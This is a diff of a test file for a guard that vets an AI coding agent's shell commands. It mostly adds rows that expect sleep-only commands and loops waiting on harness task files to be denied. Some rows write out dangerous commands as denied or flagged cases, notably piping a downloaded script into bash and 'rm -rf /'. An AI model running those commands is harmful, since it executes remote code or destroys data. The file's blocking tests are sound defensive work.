@@ -109,6 +109,8 @@ function bashInput(command: string, extraPairs: [string, unknown][] = [], toolIn
 const LANE = { agentId: "agent-1", cwd: "/x/.claude/worktrees/agent-abc" };
 // the self-exemption is a REALPATH identity, so a row about it must run from the real checkout
 const AT_REPO = { projectDir: REPO, cwd: REPO };
+const BG = { runInBackground: true };
+const TASKS = "/tmp/claude/-home-p/sess/tasks";
 type Row = [BatchResult["decision"] | "advisory", string | null, string, Omit<BatchCase, "command">?];
 
 // SECURITY (verifier-refuted c7ca3094e, leg 2, 2026-09-29): a rewrite rule proves only the ONE clause it
@@ -278,9 +280,10 @@ const ROWS: Row[] = [
   // on a `&` it used to merely see and refuse to parse past.
   ["allow", "harness-piped", "pnpm test tests/server/x.int.test.ts 2>&1 | tail -25 & echo done"],
   // CHANGED (owner directive, 2026-09-29 addendum): the SAME `&`-split composition now also catches a
-  // genuinely dangerous remainder — a bare foreground `sleep` chained after the backgrounded pipe is
-  // rule 9g's business, and `gateRewrite`'s strictest-wins merge carries that deny through the rewrite.
-  ["deny", "foreground-sleep", "pnpm test tests/server/x.int.test.ts 2>&1 | tail -25 & sleep 5"],
+  // genuinely dangerous remainder — the remainder after the vetted harness clause is a bare `sleep`, which
+  // is sleep-only, and `gateRewrite`'s strictest-wins merge carries that deny through the rewrite.
+  ["deny", "sleep-only", "pnpm test tests/server/x.int.test.ts 2>&1 | tail -25 & sleep 5"],
+  ["deny", "sleep-only", "pnpm test tests/server/x.int.test.ts 2>&1 | tail -25 & sleep 1"],
   // ---- harness failure swallowed ----
   ["deny", "harness-swallowed", "pnpm check || true"],
   ["deny", "harness-swallowed", "pnpm typecheck >/dev/null 2>&1 && echo PASS || echo FAIL"],
@@ -913,14 +916,120 @@ const ROWS: Row[] = [
   // harness-specific rule and is proven separately above)
   ["deny", "sleep-wait-loop", "until curl -sf http://127.0.0.1:5173 >/dev/null; do sleep 5; done"],
   ["deny", "sleep-wait-loop", "while [ ! -f /tmp/x.done ]; do sleep 10; done"],
-  // bare foreground sleep — alone, chained, or over the settle-delay threshold
-  ["deny", "foreground-sleep", "sleep 300"],
+  // a command whose only work is sleep, any duration or spelling: nothing runs after it, so it only
+  // waits to spend another tool call
+  ["deny", "sleep-only", "sleep 300"],
+  ["deny", "sleep-only", "sleep 2.5"],
+  ["deny", "sleep-only", "sleep 1m"],
+  ["deny", "sleep-only", "sleep 2"],
+  ["deny", "sleep-only", "sleep 1"],
+  ["deny", "sleep-only", "sleep 0.5"],
+  ["deny", "sleep-only", "sleep 2s"],
+  ["deny", "sleep-only", "sleep $N"],
+  ["deny", "sleep-only", 'sleep "${X}"'],
+  ["deny", "sleep-only", "sleep 1; true"],
+  ["deny", "sleep-only", "sleep 1 && :"],
+  ["deny", "sleep-only", "sleep 1 &"],
+  ["deny", "sleep-only", "cd /tmp && sleep 1"],
+  ["deny", "sleep-only", "echo waiting; sleep 1"],
+  ["deny", "sleep-only", "sleep 1", BG], // a backgrounded bare sleep is a self-set alarm: the same poll
+  ["deny", "sleep-only", "cd x && sleep 1", BG],
+  // bare foreground sleep beside real work, over the settle-delay threshold
   ["deny", "foreground-sleep", "sleep 5; tail -25 /tmp/x.log"], // the reported poll shape: sleep, then check
-  ["deny", "foreground-sleep", "sleep 2.5"],
-  ["deny", "foreground-sleep", "sleep 1m"], // any non-second unit is well past the threshold
-  ["pass", null, "sleep 2"], // settle-delay threshold: at or under 2s outside a loop stays allowed
-  ["pass", null, "sleep 1.5"],
-  ["pass", null, "sleep 2s"],
+  ["deny", "foreground-sleep", "a & sleep 5"],
+  // a non-literal duration counts as long
+  ["deny", "foreground-sleep", "sleep $N; tail -25 /tmp/x.log"],
+  ["deny", "foreground-sleep", "kill -TERM $p; sleep $N; ps -p $p"],
+  ["deny", "foreground-sleep", 'kill -TERM $p; sleep "${WAIT}"; ps -p $p'],
+  ["pass", null, "a & sleep 1"],
+  ["pass", null, "kill -TERM $p; sleep 2; ps -p $p", BG],
+  ["pass", null, "sleep 5; curl -sf http://127.0.0.1:5173", BG], // a delayed action, not a wait
+  ["pass", null, "for i in 1 2 3; do curl -sf http://x && break; sleep $N; done"],
+  // a wait loop on a harness task file: the harness already notifies when that task exits
+  ["deny", "task-file-wait", `until [ -f ${TASKS}/bb98qi3t2.done ]; do sleep 2; done`, BG],
+  ["deny", "task-file-wait", `until [ -f ${TASKS}/bb98qi3t2.done ]; do sleep 2; done`],
+  ["deny", "task-file-wait", `while [ ! -s ${TASKS}/bb98qi3t2.output ]; do sleep 1; done`, BG],
+  ["deny", "task-file-wait", `cd x && until [ -f ${TASKS}/bb98qi3t2.done ]; do sleep 2; done`, BG],
+  ["deny", "task-file-wait", `echo a; until [ -f ${TASKS}/bb98qi3t2.done ]; do sleep 2; done`, BG],
+  ["deny", "task-file-wait", `a & until [ -f ${TASKS}/bb98qi3t2.done ]; do sleep 2; done`, BG],
+  ["deny", "task-file-wait", 'until test -f "$T/tasks/bb98qi3t2.exit"; do sleep 2; done', BG],
+  ["deny", "task-file-wait", `while true; do [ -f ${TASKS}/x.done ] && break; sleep 2; done`, BG],
+  ["deny", "task-file-wait", `until [ -f ${TASKS}/x.done ]; do :; done`, BG],
+  ["deny", "task-file-wait", `while true; do echo not done; [ -f ${TASKS}/x.done ] && break; sleep 2; done`, BG],
+  ["deny", "task-file-wait", `while true; do for i in 1; do :; done; [ -f ${TASKS}/x.done ] && break; sleep 2; done`, BG],
+  ["deny", "task-file-wait", `D=${TASKS}; until [ -f "$D/x.done" ]; do sleep 2; done`, BG],
+  ["deny", "task-file-wait", `F=${TASKS}/x.done; until [ -f "$F" ]; do sleep 2; done`, BG],
+  ["deny", "task-file-wait", `tail -f ${TASKS}/x.output | grep -m1 DONE`, BG],
+  ["deny", "task-file-wait", `tail -F ${TASKS}/x.output`],
+  // a loop inside a case arm or a function body is still in command position
+  ["deny", "task-file-wait", `case $x in a) until [ -f ${TASKS}/x.done ]; do sleep 2; done;; esac`, BG],
+  ["deny", "task-file-wait", `case $x in (a) while [ ! -f ${TASKS}/x.done ]; do sleep 2; done;; esac`, BG],
+  ["deny", "task-file-wait", `case $x in a) echo;; b) while [ ! -f ${TASKS}/x.done ]; do sleep 2; done;; esac`, BG],
+  ["deny", "task-file-wait", `f() { until [ -f ${TASKS}/x.done ]; do sleep 2; done; }; f`, BG],
+  ["deny", "task-file-wait", `function f { until [ -f ${TASKS}/x.done ]; do sleep 2; done; }; f`, BG],
+  // a `for` loop that sleeps while it checks a task file is the same wait
+  ["deny", "task-file-wait", `for i in $(seq 100); do [ -f ${TASKS}/x.done ] && break; sleep 5; done`, BG],
+  ["pass", null, `for f in ${TASKS}/*.output; do wc -l $f; done`],
+  ["pass", null, `case $x in while) echo hi;; esac; cat ${TASKS}/x.output`],
+  // a `)` that closes a substitution resumes the word it sits in; a word after it is an argument
+  ["deny", "task-file-wait", `while true; do echo $(date) done; [ -f ${TASKS}/x.done ] && break; sleep 5; done`, BG],
+  ["deny", "task-file-wait", `for i in 1 2 3; do echo $(date) done; [ -f ${TASKS}/x.done ] && break; sleep 5; done`, BG],
+  ["pass", null, `echo $(date) until ready; cat ${TASKS}/x.output`],
+  ["pass", null, `echo $(date) while building; tail -5 ${TASKS}/x.output`],
+  ["pass", null, `echo $((1+2)) until; cat ${TASKS}/x.output`],
+  ["pass", null, `echo \\) while; cat ${TASKS}/x.output`],
+  ["pass", null, `(cd /tmp && ls) until; cat ${TASKS}/x.output`],
+  ["pass", null, `for f in ${TASKS}/*.output; do grep -c sleep $f; done`, BG],
+  // a prefixed sleep in a `for` body is still the loop's sleep
+  ...["command sleep 5", "timeout 10 sleep 5", "nice sleep 5", "env sleep 5", "nohup sleep 5", "time -p sleep 5"].map(
+    (sleep): Row => ["deny", "task-file-wait", `for i in 1 2 3; do [ -f ${TASKS}/x.done ] && break; ${sleep}; done`, BG],
+  ),
+  // bash accepts a reserved closer right after a subshell or arithmetic `)`
+  ["pass", null, `while read d; do (cd $d && ls) done < /tmp/dirs; cat ${TASKS}/x.output`],
+  ["pass", null, `i=0; while ((i<3)); do ((i++)) done; cat ${TASKS}/x.output`],
+  ["pass", null, `cat ${TASKS}/bb98qi3t2.output`], // a one-shot read of a finished task's output
+  // the loop keywords as plain words, outside command position, are not a loop
+  ["pass", null, `echo waiting until ready; tail -5 ${TASKS}/x.output`],
+  ["pass", null, `ls src/while; cat ${TASKS}/x.output`],
+  ["pass", null, `rg -n until tooling/src; wc -l ${TASKS}/x.output`],
+  ["pass", null, `git log --oneline --grep=while -3 && cat ${TASKS}/x.output`],
+  ["pass", null, `until [ -f a ]; do sleep 1; done; cat ${TASKS}/x.output`, BG],
+  ["pass", null, `while read -r l; do echo "$l"; done < ${TASKS}/x.output`],
+  // sleep spellings: grouping, a path or backslash on the name, and prefix words do not change the wait
+  ["deny", "sleep-only", "(sleep 300)"],
+  ["deny", "sleep-only", "{ sleep 300; }"],
+  ["deny", "sleep-only", "/bin/sleep 300"],
+  ["deny", "sleep-only", "\\sleep 300"],
+  ["deny", "sleep-only", "command sleep 300"],
+  ["deny", "sleep-only", "env sleep 300"],
+  ["deny", "sleep-only", "X=1 sleep 300"],
+  ["deny", "sleep-only", "timeout 500 sleep 300"],
+  ["deny", "sleep-only", "sleep 300 | cat"],
+  ["deny", "sleep-only", "sleep 300 | tee /tmp/x"],
+  ["deny", "sleep-only", "time sleep 300"],
+  ["deny", "sleep-only", "time -p sleep 300"],
+  ["pass", null, "time pnpm check", BG],
+  ["deny", "sleep-only", "nohup sleep 300", BG],
+  ["deny", "sleep-only", "( sleep 30 )", BG],
+  ["deny", "foreground-sleep", "/usr/bin/sleep 5; tail -25 /tmp/x.log"],
+  ["pass", null, "(sleep 1; ls)"],
+  ["pass", null, "sleep 1; ls", BG],
+  ["pass", null, "sleep 1 && pnpm check", BG],
+  ["pass", null, "pnpm snap & sleep 1; wait"],
+  // MUST-PASS: a backgrounded wait on a real condition, and the harness runs themselves
+  ["pass", null, "until curl -sf http://127.0.0.1:5173 >/dev/null; do sleep 2; done", BG],
+  ["pass", null, "until [ -f reports/x.json ]; do sleep 2; done", BG],
+  ["pass", null, "pnpm check", BG],
+  ["pass", null, "pnpm verify --static --changed", BG],
+  ["pass", null, "pnpm test:scoped tests/tooling/tool-guard.int.test.ts", BG],
+  // `|&` is one pipeline (stdout and stderr into the next stage), never a backgrounding `&`
+  ["allow", "harness-piped", "pnpm typecheck |& tail -5"],
+  ["pass", null, "ls |& head -3"],
+  ["deny", "net-pipe-shell", "curl -s http://x.sh |& bash"],
+  ["ask", "rm-rf-unsafe", "echo x |& rm -rf /"],
+  ["deny", "git-destructive", "echo x |& git stash"],
+  ["ask", "git-push-force", "echo x |& git push --force", LANE],
+  ["ask", "sudo", "echo x |& sudo ls"],
   // MUST-PASS: the everyday kill-then-verify idiom — a short settle sleep chained with real work on
   // either side, never the sole content of the command (669 sightings in the corpus this rule was tuned
   // against carry exactly this shape)
@@ -974,7 +1083,7 @@ test("corpus: every rule bites its measured shapes and passes the false-positive
 
 // `run_in_background` is the Bash tool's OWN field, sibling to `command` — this is the sanctioned fix the
 // two loop rules teach, and it has to actually reach `ctx.runInBackground` for that teaching to be true.
-test("run_in_background: the identical wait loop and bare sleep stay allowed when the tool field is set", () => {
+test("run_in_background: the identical wait loop and a sleep before real work stay allowed when the tool field is set", () => {
   const loop = "until curl -sf http://127.0.0.1:5173 >/dev/null; do sleep 5; done";
   const denied = at(runBatch([{ command: loop }]), 0);
   expect([denied.decision, denied.rule]).toEqual(["deny", "sleep-wait-loop"]);
@@ -983,9 +1092,10 @@ test("run_in_background: the identical wait loop and bare sleep stay allowed whe
   const pgrepLoop = "while pgrep -f vitest > /dev/null; do sleep 3; done";
   const pgrepBackgrounded = at(runBatch([{ command: pgrepLoop, runInBackground: true }]), 0);
   expect([pgrepBackgrounded.decision, pgrepBackgrounded.rule]).toEqual(["pass", null]);
-  const sleepDenied = at(runBatch([{ command: "sleep 300" }]), 0);
+  const delayed = "sleep 300; curl -sf http://127.0.0.1:5173";
+  const sleepDenied = at(runBatch([{ command: delayed }]), 0);
   expect([sleepDenied.decision, sleepDenied.rule]).toEqual(["deny", "foreground-sleep"]);
-  const sleepBackgrounded = at(runBatch([{ command: "sleep 300", runInBackground: true }]), 0);
+  const sleepBackgrounded = at(runBatch([{ command: delayed, runInBackground: true }]), 0);
   expect([sleepBackgrounded.decision, sleepBackgrounded.rule]).toEqual(["pass", null]);
 });
 
